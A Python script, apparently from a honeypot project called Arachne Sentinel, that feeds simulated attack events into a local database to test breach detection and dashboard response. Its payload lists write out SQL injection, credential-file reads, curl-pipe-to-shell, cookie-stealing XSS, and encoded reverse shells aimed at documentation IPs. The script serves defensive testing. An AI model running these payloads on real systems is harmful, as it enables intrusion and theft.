#!/usr/bin/env python3
"""
Arachne Sentinel — İHLAL TATBİKATI: maksimum yoğunluklu çok-vektörlü saldırı.

Amac: kalkanin/komuta merkezinin bir IHLAL durumundaki TEPKISINI test etmek.
Bu script, honeypot'a GERCEK, yuksek yogunluklu, cok vektorlu bir saldiri
akitir (SQLi, RCE, path traversal, kodlanmis kabuk, kimlik-doldurma sprey,
yatay port taramasi...). Tum olaylar GERCEKTEN veritabanina yazilir ve
GERCEK tespit motoru tarafindan islenir — hicbir savunma mantigi degistirilmez.

--- DURUSTLUK / ETIK ---
* Tamamen savunma. Hicbir dis sisteme tek paket gitmez; tum adresler RFC 5737
  (198.51.100.0/24, 203.0.113.0/24) ve RFC 2544 (198.18.0.0/15) dokumantasyon-
  test araliklarindandir.
* Bu saldiri gercekte kalkani DELMEZ: aldatma mimarisinde saldirgan gercek
  varliga ulasamaz, tespit motoru olaylari yakalar. "Kalkanin delinmesi" ayri,
  acikca ETIKETLENMIS bir GORSEL TATBIKAT'tir (panelde Shift+B / "Ihlal
  Tatbikati" dugmesi) — gercek bir ihlal iddiasi DEGILDIR, yalnizca komuta
  merkezinin ihlal tepkisini (kirmizi kriz, cekirdege sizinti animasyonu,
  AI ihlal anonsu, otomatik cevreleme) sinamak icindir.

Kullanim:
  source .venv/bin/activate
  python main.py app            # 1. terminal: komuta merkezi
  python scripts/demo_breach.py # 2. terminal: yogun saldiri
  # Panelde saldiri akarken Shift+B (veya "Ihlal Tatbikati" dugmesi) ile
  # kalkanin delinme/sizinti TEPKISINI tetikle.
"""
import random
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from arachne import storage  # noqa: E402

# --- Cok vektorlu saldiri yukleri (hepsi bilinen saldiri imzalari) ---
VECTORS = {
    "http": [
        "GET /?id=1' OR '1'='1 UNION SELECT username,password FROM users--",
        "POST /login.php admin' OR 1=1--",
        "GET /../../../../etc/passwd",
        "GET /index.php?page=php://filter/convert.base64-encode/resource=config",
        "POST /upload cmd=;cat /etc/shadow;",
        "GET /shell.php?c=$(curl 198.18.7.9/x|sh)",
        "GET /?q=<script>document.location='//198.51.100.9/'+document.cookie</script>",
        "GET /wp-admin/ ../../wp-config.php",
    ],
    "ssh": [
        "root:toor", "admin:admin", "root:123456", "admin:password",
        "oracle:oracle", "postgres:postgres", "git:git", "ubuntu:ubuntu",
    ],
    "mysql": [
        "SELECT * FROM mysql.user INTO OUTFILE '/var/www/shell.php'",
        "'; DROP TABLE users; --",
        "UNION SELECT load_file('/etc/passwd')",
    ],
    "ftp": [
        "USER anonymous", "SITE EXEC /bin/sh", "STOR ../../../backdoor",
    ],
}

# Sprey icin cok sayida kullanici (tek parola) + kaba-kuvvet (tek kullanici cok parola)
SPRAY_USERS = [f"user{i}" for i in range(1, 22)]
BRUTE_PW = ["123456", "password", "admin", "letmein", "qwerty", "root",
            "toor", "changeme", "welcome", "monkey", "dragon", "master"]


def _emit(ip, service, payload, etype="data"):
    try:
        storage.log_event(source_ip=ip, service=service, event_type=etype,
                          payload=payload, metadata={"drill": "breach"})
    except TypeError:
        # imza farkli olabilir; en yaygin bicime dus
        storage.log_event(source_ip=ip, service=service, event_type=etype,
                          payload=payload)


def wave(title, fn, count):
    print(f"\n  ▸ {title}")
    fn(count)


def multi_vector(n):
    ips = [f"198.18.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(8)]
    for i in range(n):
        ip = random.choice(ips)
        svc = random.choice(list(VECTORS.keys()))
        payload = random.choice(VECTORS[svc])
        _emit(ip, svc, payload)
        if i % 12 == 0:
            print(f"    {ip:16} {svc:6} {payload[:52]}")
        time.sleep(0.02)


def horizontal_scan(n):
    ip = "203.0.113.77"
    services = ["ssh", "ftp", "mysql", "http", "smtp", "rdp", "telnet", "vnc"]
    for i in range(n):
        _emit(ip, random.choice(services), f"CONNECT probe port-sweep #{i}", etype="connect")
        time.sleep(0.015)
    print(f"    {ip} tek kaynaktan {n} servis/port taramasi (yatay tarama)")


def credential_spray(n):
    ip = "203.0.113.88"
    for i in range(n):
        u = SPRAY_USERS[i % len(SPRAY_USERS)]
        _emit(ip, "ssh", f"{u}:Winter2025!", etype="auth")
        time.sleep(0.015)
    print(f"    {ip} {len(SPRAY_USERS)} farkli kullaniciya tek parola (sprey)")


def brute_force(n):
    ip = "198.51.100.42"
    for i in range(n):
        _emit(ip, "ssh", f"admin:{BRUTE_PW[i % len(BRUTE_PW)]}", etype="auth")
        time.sleep(0.012)
    print(f"    {ip} tek kullaniciya {n} parola denemesi (kaba-kuvvet)")


def encoded_shells(n):
    ip = "198.18.44.44"
    shells = [
        "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguMTguNy45LzQ0NDQgMD4mMQ== | base64 -d | bash",
        "%2e%2e%2f%2e%2e%2fbin%2fsh",
        "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64",
        "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.18.7.9\",4444))'",
    ]
    for i in range(n):
        _emit(ip, "http", random.choice(shells))
        time.sleep(0.02)
    print(f"    {ip} ic ice kodlanmis ters-kabuk yukleri")


def run_breach():
    storage.init_db()
    print("=" * 64)
    print("  ARACHNE SENTINEL — İHLAL TATBİKATI (maksimum yoğunluk)")
    print("  Tamamen savunma · RFC 5737/2544 test adresleri · gerçek tespit")
    print("=" * 64)

    wave("Vektör 1-4: SQLi / RCE / LFI / XSS bombardımanı", multi_vector, 90)
    wave("Vektör 5: yatay port/servis taraması", horizontal_scan, 40)
    wave("Vektör 6: kimlik-doldurma (parola spreyi)", credential_spray, 42)
    wave("Vektör 7: kaba-kuvvet oturum saldırısı", brute_force, 48)
    wave("Vektör 8: kodlanmış ters-kabuk yükleri", encoded_shells, 24)

    print("\n" + "=" * 64)
    print("  ✅ Yoğun saldırı akıtıldı — gerçek tespit motoru hepsini işledi.")
    print("     (Aldatma mimarisinde saldırgan gerçek varlığa ULAŞAMAZ;")
    print("      panelde çekirdeğe ulaşan gerçek saldırı = 0 kalır.)")
    print("")
    print("  ⛔ İHLAL TEPKİSİNİ test etmek için komuta merkezinde:")
    print("       • Shift + B  tuşuna bas,  VEYA")
    print("       • Asistan panelindeki \"⛔ İhlal Tatbikatı\" düğmesine tıkla.")
    print("     → Kalkan delinir, çekirdeğe sızıntı animasyonu oynar, AI ihlal")
    print("       anonsu yapar ve otomatik çevreleme mesajı gelir.")
    print("     (Bu bir SİMÜLASYON'dur; gerçek bir ihlal değildir.)")
    print("=" * 64)


if __name__ == "__main__":
    run_breach()
